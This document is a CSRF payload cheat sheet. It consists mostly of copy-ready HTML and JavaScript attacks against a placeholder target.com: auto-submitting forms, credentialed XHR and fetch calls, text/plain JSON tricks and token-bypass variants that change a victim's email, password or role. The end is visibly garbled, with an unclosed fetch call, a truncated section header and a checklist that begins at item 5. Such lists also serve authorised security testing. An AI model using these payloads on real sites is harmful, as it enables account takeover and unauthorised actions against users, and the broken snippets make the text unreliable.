# CSRF (Cross-Site Request Forgery) Payloads

## ========================================
## BASIC CSRF - GET REQUEST
## ========================================

# Simple Image Tag
<img src="http://target.com/delete?id=123">

# IFrame
<iframe src="http://target.com/delete?id=123"></iframe>

# Script Tag
<script src="http://target.com/delete?id=123"></script>

# Link (requires user click)
<a href="http://target.com/delete?id=123">Click here</a>

## ========================================
## BASIC CSRF - POST REQUEST
## ========================================

# Auto-submit Form
<html>
<body onload="document.forms[0].submit()">
<form action="http://target.com/change-email" method="POST">
  <input type="hidden" name="email" value="attacker@evil.com">
  <input type="submit" value="Submit">
</form>
</body>
</html>

# With AJAX
<script>
var xhr = new XMLHttpRequest();
xhr.open("POST", "http://target.com/change-password", true);
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
xhr.send("password=newpass123");
</script>

# Using Fetch API
<script>
fetch('http://target.com/api/delete', {
  method: 'POST',
  credentials: 'include',
  headers: {
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({id: 123})
});
</script>

## ========================================
## CSRF WITH JSON
## ========================================

# Simple Form
<form action="http://target.com/api/update" method="POST" enctype="text/plain">
  <input name='{"email":"attacker@evil.com","id":' value='123}'>
</form>

# Using XMLHttpRequest
<script>
var xhr = new XMLHttpRequest();
xhr.open("POST", "http://target.com/api/update", true);
xhr.setRequestHeader("Content-Type", "application/json");
xhr.withCredentials = true;
var data = '{"email":"attacker@evil.com"}';
xhr.send(data);
</script>

## ========================================
## CSRF TOKEN BYPASS
## ========================================

# Remove CSRF token parameter
# Change: email=attacker@evil.com&csrf=TOKEN
# To: email=attacker@evil.com

# Empty CSRF token
csrf=

# Use different method (GET instead of POST)
<img src="http://target.com/change-email?email=attacker@evil.com">

# Use another user's token
csrf=VICTIM_TOKEN

# Token in custom header bypass
# If app only checks custom header:
<form method="POST" action="http://target.com/update" enctype="text/plain">
  <input name='{"email":"attacker@evil.com"}' value='x'>
</form>

## ========================================
## SAME-SITE COOKIE BYPASS
## ========================================

# Using subdomain takeover
<form action="http://sub.target.com/update" method="POST">
  <input type="hidden" name="email" value="attacker@evil.com">
</form>

# WebSocket CSRF
<script>
var ws = new WebSocket('ws://target.com/socket');
ws.onopen = function() {
  ws.send('{"action":"delete","id":123}');
};
</script>

## ========================================
## ADVANCED CSRF TECHNIQUES
## ========================================

# Flash-based CSRF
<object data="http://target.com/file.swf">
  <param name="allowScriptAccess" value="always">
  <param name="flashvars" value="url=http://target.com/delete">
</object>

# Form with multiple values
<form action="http://target.com/update" method="POST">
  <input type="hidden" name="email[]" value="attacker@evil.com">
  <input type="hidden" name="email[]" value="admin@target.com">
</form>

# Multipart CSRF
<form action="http://target.com/upload" method="POST" enctype="multipart/form-data">
  <input type="hidden" name="file" value="malicious.php">
</form>

## ========================================
## CONTENT-TYPE TRICKS
## ========================================

# text/plain to bypass CORS
<form action="http://target.com/api/update" method="POST" enctype="text/plain">
  <input name='{"role":"admin"}' value=''>
</form>

# This sends: {"role":"admin"}=

## ========================================
## CSRF WITH XSS

<script>
fetch('http://target.com/api/delete', {
  method: 'POST',
  credentials: 'include',
  body: JSON.stringify({id: document.cookie})

</script>

5. Test changing HTTP method (POST to GET)
6. Test Content-Type changes
7. Test Referer header validation
8. Test Origin header validation
9. Test SameSite cookie attribute
10. Test CORS configuration
